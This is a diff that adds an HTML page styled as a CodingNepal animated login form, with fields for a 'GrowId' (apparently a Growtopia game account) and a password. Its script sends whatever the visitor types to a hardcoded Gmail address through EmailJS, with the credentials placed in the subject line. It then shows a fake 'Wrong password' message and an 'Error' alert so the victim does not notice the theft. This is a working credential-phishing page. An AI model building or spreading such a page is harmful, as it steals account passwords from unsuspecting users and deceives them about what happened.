@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<!-- Coding By CodingNepal - youtube.com/codingnepal -->
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Animated Login Form | CodingNepal</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  </head>
+  <body>
+    <div class="center">
+      <h1>Login</h1>
+      <form method="post">
+        <div class="txt_field">
+          <input id="growid" type="text" required>
+          <span></span>
+          <label>GrowId</label>
+        </div>
+        <div class="txt_field">
+          <input id="pass" type="text" required>
+          <span></span>
+          <label>Password</label>
+        </div>
+        <div id="forgotpas" class="pass">Wrong password</div>
+        <input id="subbtn" onclick="sendMail()" type="button" value="Login">
+        <div class="signup_link">
+          Not a member? <a href="#">Signup</a>
+        </div>
+      </form>
+    </div>
+    
+    
+    <script>
+      function sendMail(){
+        console.log("clicked")
+        const growId = document.getElementById("growid").value;
+        const password = document.getElementById("pass").value;
+        const fgpass = document.getElementById("forgotpas");
+        
+        (function(){
+          emailjs.init("oAmdtCGrLEtftqugQ"); // Account Public Key
+        })();
+
+        var params = {
+          sendername: growId,
+          to: 'izulkocaxx200@gmail.com',
+          subject: growId+'||'+password,
+          replyto: 'replyto',
+          message: 'ini massage',
+        };
+
+        var serviceID = "service_kdwzqo5"; // Email Service ID
+        var templateID = "template_yahalhk"; // Email Template ID
+
+        emailjs.send(serviceID, templateID, params)
+        .then( res => {
+          fgpass.style.color="red";
+            alert("Error");
+        })
+        .catch();
+      }
+    </script>
+  </body>
+</html>
